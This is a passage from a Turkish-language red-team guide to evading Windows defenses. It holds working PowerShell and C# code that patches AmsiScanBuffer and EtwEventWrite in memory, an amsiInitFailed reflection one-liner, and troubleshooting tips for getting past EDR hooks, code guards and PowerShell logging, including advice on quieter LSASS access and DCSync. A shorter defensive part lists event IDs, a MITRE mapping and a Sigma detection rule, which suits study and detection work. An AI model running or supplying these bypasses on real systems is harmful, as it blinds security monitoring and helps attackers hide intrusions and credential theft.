## 2. Teknik Derinlik — AMSI, ETW ve Syscall Mekaniği

### 2.1 AMSI (Antimalware Scan Interface) Anatomisi
AMSI, Windows işletim sistemine entegre edilmiş dinamik bir içerik değerlendirme arayüzüdür:
- PowerShell, WScript, CScript veya Office makroları çalıştırılmadan önce `amsi.dll` yüklenir.
- Betik içeriği bellekte derlendiğinde `AmsiScanBuffer` API'sine iletilir.
- Kurulu olan antivirüs/EDR yazılımı bu tamponu tarar ve bir risk skoru döndürür (`AMSI_RESULT_DETECTED` veya `AMSI_RESULT_CLEAN`).
- **Bellek Yamalama (Patching):** Saldırgan kendi sürecinin sanal bellek alanındaki `AmsiScanBuffer` fonksiyonunun ilk baytlarına `mov eax, 0x80070057; ret` (E_INVALIDARG) yazar. Bu sayede fonksiyon her çağrıldığında parametre geçersiz hatası alarak taramayı gerçekleştirmeden sıfır koduyla döner.

### 2.2 ETW (Event Tracing for Windows) Körletme
ETW, Windows çekirdeği ve uygulamaları arasında yüksek performanslı olay kaydı sağlayan bir omurgadır:
- EDR'lar `.NET` derlemelerinin yüklenmesini (`Microsoft-Windows-DotNETRuntime`), bellek tahsislerini ve şüpheli thread oluşumlarını ETW üzerinden yakalar.
- Kullanıcı alanında (User-mode) çalışan her `.NET` programı olayları `ntdll.dll!EtwEventWrite` fonksiyonu ile işletim sistemine iletir.
- **Bypass:** `EtwEventWrite` fonksiyonunun giriş adresine tek baytlık `ret` (`0xC3`) talimatı yazıldığında, süreç hiçbir telemetri paketi üretmez; böylece EDR'ın .NET izleme kanalı sessizleşir.

### 2.3 Doğrudan Sistem Çağrıları (Direct Syscalls & Unhooking)
Modern EDR'lar `ntdll.dll` içerisindeki kritik API'lerin (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) ilk baytlarına **JMP kancaları (Hook)** yerleştirerek trafiği kendi denetim motoruna yönlendirir:
- **API Unhooking:** Diskteki temiz `\KnownDlls\ntdll.dll` dosyası belleğe haritalanır ve EDR'ın bellek üzerindeki kancaları temiz kodla üzerine yazılır.
- **Direct Syscalls (Hell's / Halo's Gate):** EDR kancaları atlanarak doğrudan derleyici düzeyinde `mov eax, <SSN>; syscall; ret` komutları çalıştırılır. Kullanıcı modu EDR kancaları devre dışı kalır.

## 3. Pratik Uygulama — Bellek Yamalama ve OPSEC Hijyeni

### 3.1 PowerShell Bellek İçi AMSI Yamalama (In-Memory Patch)
```powershell
# AmsiScanBuffer adresini bulup bellek iznini değiştirerek baypas uygulama
$AmsiDll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE('amsi.dll')
$AmsiScanBuffer = [System.Runtime.InteropServices.Marshal]::GetProcAddress($AmsiDll, 'AmsiScanBuffer')

# Bellek sayfasını PAGE_EXECUTE_READWRITE (0x40) yap
$OldProtect = 0
[System.Runtime.InteropServices.Marshal]::VirtualProtect($AmsiScanBuffer, [IntPtr]5, 0x40, [ref]$OldProtect)

# x64: mov eax, 0x80070057; ret -> b8 57 00 07 80 c3
$Patch = [Byte[]] (0xb8, 0x57, 0x00, 0x07, 0x80, 0xc3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $AmsiScanBuffer, 6)

# Bellek iznini eski haline döndür
[System.Runtime.InteropServices.Marshal]::VirtualProtect($AmsiScanBuffer, [IntPtr]5, $OldProtect, [ref]$OldProtect)
Write-Output "[+] AMSI başarıyla yamalandı!"
```

### 3.2 In-Memory ETW Körletme (C# / PowerShell)
```csharp
// ntdll!EtwEventWrite fonksiyonunu tek baytlık RET ile nötralize etme
IntPtr ntdll = LoadLibrary("ntdll.dll");
IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

uint oldProtect;
VirtualProtect(etwEventWrite, (UIntPtr)1, 0x40, out oldProtect);

// 0xC3 = RET talimatı
byte[] patch = { 0xC3 };
Marshal.Copy(patch, 0, etwEventWrite, 1);

VirtualProtect(etwEventWrite, (UIntPtr)1, oldProtect, out oldProtect);
```

### 3.3 Beacon Object Files (BOF) ile PowerShell Yüzeyini Terk Etme

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Durum | Teknik Neden | Çözüm / Yaklaşım |
|---|---|---|
| `VirtualProtect: Access Denied (0x00000005)` | Süreç Arbitrary Code Guard (ACG) veya EDR bellek koruma sürücüsü ile korunmaktadır. | Bellek korumasını değiştirmek yerine Hardware Breakpoint (Dr0-Dr3 yazmaçları) veya doğrudan unmanaged DLL kullanın. |
| `PowerShell Çökmesi (Access Violation 0xc0000005)` | Bellek yaması uygulanırken x86 ve x64 mimari ofsetleri karıştırılmıştır. | İşletim sisteminin 64-bit olduğunu doğrulayın; 6 baytlık x64 yamasını (`b8 57 00 07 80 c3`) kullandığınızdan emin olun. |
| `ETW Yaması Sonrası EDR Tarafından Engellenme` | EDR, `ntdll.dll` kod bütünlüğünü periyodik olarak doğrulamakta ve `EtwEventWrite` üzerindeki `0xC3` baytını tespit etmektedir. | Kanca yamalamak yerine temiz `ntdll` haritalama (Unhooking) veya kernel-level ETW bypass tekniklerine geçin. |
| `ScriptBlock 4104 Günlüğe Düşmeye Devam Ediyor` | PowerShell komutu çalıştırılmadan önce başlatılan ilk script bloğu yama yapılmadan önce günlüğe kaydedilmiştir. | PowerShell CLI yerine unmanaged C# execute-assembly veya Beacon Object File (BOF) kullanın. |
| `Event Log Clear (1102) Alarmı Tetiklendi` | Güvenlik günlüğünü silmek için `wevtutil cl Security` komutu çalıştırılmıştır. | **Asla log temizleme komutu çalıştırmayın.** Log silmek yerine log üretimini engelleme stratejisini (iz bırakmama) benimseyin. |
| `Sysmon Event 10 / OpenProcess Engellendi` | Hedef sürecin (LSASS) tutamacı `PROCESS_ALL_ACCESS` yetkisiyle talep edilmiştir. | Yalnızca gereken minimum izinleri (`PROCESS_VM_READ`) talep edin veya process injection yerine doğrudan ağ API'lerini (DCSync) kullanın. |

## 5. Bıraktığı İz, Karşı Tespit ve Tehdit Avcılığı

### 5.1 Olay Günlükleri Analiz Matrisi

| Olay Kimliği | Günlük Kaynağı | Anlamı ve Tespit Sinyali |
|---|---|---|
| **Event ID 1102** | Security (Yerel) | **Olay Günlüğü Temizlendi:** Güvenlik günlüğünün elle silindiğini bildiren en kritik alarmdır. |
| **Event ID 4104** | PowerShell Operational | **ScriptBlock Logging:** `AmsiScanBuffer`, `VirtualProtect` veya `EtwEventWrite` içeren betik blokları. |
| **Sysmon Event 10** | Microsoft-Windows-Sysmon | **İşlem Erişimi (ProcessAccess):** Bir sürecin başka bir sürecin belleğini `PAGE_EXECUTE_READWRITE` yapması. |
| **Sysmon Event 8** | Microsoft-Windows-Sysmon | **Uzak Thread Oluşturma (CreateRemoteThread):** Süreç enjeksiyonu göstergesi. |

### 5.2 MITRE ATT&CK Eşleştirmesi
- **Taktik:** Defense Evasion (TA0005)
- **Teknik:** Impair Defenses: Disable or Modify Tools ([T1562.001](https://attack.mitre.org/techniques/T1562/001/))
- **İlişkili Teknik:** Indicator Blocking: ETW ([T1562.006](https://attack.mitre.org/techniques/T1562/006/)), Indicator Removal on Host ([T1070](https://attack.mitre.org/techniques/T1070/))

### 5.3 OPSEC Stratejileri

| Eylem | Tespit Riski | Profesyonel Kırmızı Takım İlkesi |
|---|---|---|
| **Log Dosyalarını Silmek** | **Kritik** | Kesinlikle yapılmamalıdır. Merkezi SIEM (WEF) anında Event 1102 alarmı üretir. |
| **PowerShell CLI Kullanımı** | **Yüksek** | Kurumsal sistemlerde PowerShell yerine derlenmiş C# ikilileri veya BOF kullanın. |
| **Canlı Bellek Yamalama** | **Orta** | EDR bellek taramaları `PAGE_EXECUTE_READWRITE` alanlarını periyodik tarar; yamadan sonra korumayı `PAGE_EXECUTE_READ` seviyesine çekin. |

### 5.4 SIEM Tespit Kuralları

**Sigma Kuralı — AMSI ve ETW Bellek Yamalama Girişimleri:**
```yaml
title: AMSI or ETW In-Memory Tampering Attempt
id: 4b291a10-2345-4a67-b891-amsietwbypass01
status: production
description: Detects PowerShell script execution containing API signatures designed to patch AMSI or ETW in memory.
logsource:
  product: windows
  service: powershell
detection:
  selection:
    ScriptBlockText|contains:
      - 'AmsiScanBuffer'
      - 'amsiInitFailed'
      - 'EtwEventWrite'
      - 'NtTraceEvent'
  condition: selection
level: high
```

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```powershell
# Komut 1: Geçerli PowerShell oturumunda dinamik bellek yaması ile AMSI'yi devre dışı bırakma
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)
```
* **Ne Yapar?:** .NET dahili `AmsiUtils` sınıfının `amsiInitFailed` bayrağını `$true` yaparak sonraki tüm script taramalarını atlar.
* **Ne Zaman Kullanılır?:** Basit PowerShell araçlarını (PowerView vb.) çalıştırmadan önce AMSI taramasını atlatmak için.
* **Parametreler:** Yansıma (Reflection) kullanarak iç değişkeni manipüle eder.

```powershell
# Komut 2: Windows bellek korumasını PAGE_EXECUTE_READWRITE (0x40) yaparak EtwEventWrite yamalama
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xC3), 0, [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::GetHINSTANCE('ntdll.dll'), 'EtwEventWrite'), 1)
```
* **Ne Yapar?:** `ntdll.dll` içindeki `EtwEventWrite` fonksiyonuna `RET` (0xC3) yazarak süreci ETW açısından sağırlaştırır.
* **Ne Zaman Kullanılır?:** .NET derlemelerini hafızaya yüklemeden önce EDR telemetrisini körletmek için.
* **Parametreler:** `0xC3`: İşlemciye fonksiyondan derhal geri dönmesini söyler.

```cmd
:: Komut 3: Oturumdaki tüm Kerberos biletlerini ve izlerini temizleme
klist purge
```
* **Ne Yapar?:** Windows LSA oturumundaki tüm TGT ve TGS bilet önbelleğini sıfırlar.
* **Ne Zaman Kullanılır?:** Test tamamlandığında sahte biletleri (Golden, Silver vb.) bellekten temizlemek için.
* **Parametreler:** Parametresiz yerel Windows yardımcı programıdır.

```powershell
# Komut 4: Operasyon boyunca oluşturulan test bilgisayar hesaplarını silme
Remove-ADComputer -Identity "FAKE_DC01$" -Confirm:$false
```
* **Ne Yapar?:** Sızma testi senaryosunda oluşturulan sahte makine hesabını etki alanı veritabanından kalıcı olarak siler.
* **Ne Zaman Kullanılır?:** Kırmızı takım operasyonu sonrası ortamı ilk haline getirme (Housekeeping) aşamasında.
* **Parametreler:** `-Confirm:$false`: Kullanıcı onayı beklemeden siler.

```powershell
# Komut 5: Nesne üzerindeki Resource-Based Constrained Delegation (RBCD) iznini geri alma
Set-ADComputer -Identity "TARGET-SRV" -Clear "msDS-AllowedToActOnBehalfOfOtherIdentity"
```
* **Ne Yapar?:** Hedef sunucunun güvenlik tanımlayıcısına eklenen RBCD arka kapısını tamamen temizler.
* **Ne Zaman Kullanılır?:** RBCD sömürüsü ve yetki yükseltme testinin ardından izinleri aslına döndürmek için.
* **Parametreler:** `-Clear`: İlgili özniteliğin tüm içeriğini boşaltır.

```powershell
# Komut 6: ScriptBlock 4104 günlüklerinde kendi komut geçmişini denetleme
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 5 | Select-Object TimeCreated, Message
```
* **Ne Yapar?:** Çalıştırılan son komutların ScriptBlock günlüğüne nasıl yansıdığını doğrular.
* **Ne Zaman Kullanılır?:** Operatörün kendi görünürlük seviyesini ve bıraktığı log izini kontrol etmesi için.
* **Parametreler:** `-Id 4104`: ScriptBlock olay kimliği; `-MaxEvents 5`: Son beş olayı getirir.
